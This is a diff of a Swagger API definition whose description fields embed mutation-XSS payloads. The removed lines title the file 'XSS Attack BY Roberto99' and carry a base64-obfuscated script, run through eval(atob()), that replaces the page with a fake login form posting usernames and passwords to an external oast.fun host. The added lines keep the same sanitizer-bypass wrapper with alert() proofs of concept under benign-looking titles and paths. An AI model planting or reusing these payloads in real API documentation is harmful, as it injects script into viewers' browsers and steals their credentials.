@@ -1,8 +1,9 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY Roberto99
+  title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL2Njc3FkcmYydnRjMDAwMDJ3M2FnZzhtZ3V3YXl5eXl5ZC5vYXN0LmZ1biI7YS5tZXRob2Q9J1BPU1QnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+
   version: production
 basePath: /JSSResource/
 produces:
@@ -14,20 +15,21 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /Roberto99:
+  /accounts:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - Roberto99_XSS_D
+        - accounts
       operationId: findAccounts
       summary: Finds all accounts
-  '/hack/hachid/{id}':
+  '/accounts/groupid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL2Njc3FkcmYydnRjMDAwMDJ3M2FnZzhtZ3V3YXl5eXl5ZC5vYXN0LmZ1biI7YS5tZXRob2Q9J1BPU1QnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS') src=1>"></form>
+
           format: int64
           in: path
           name: id
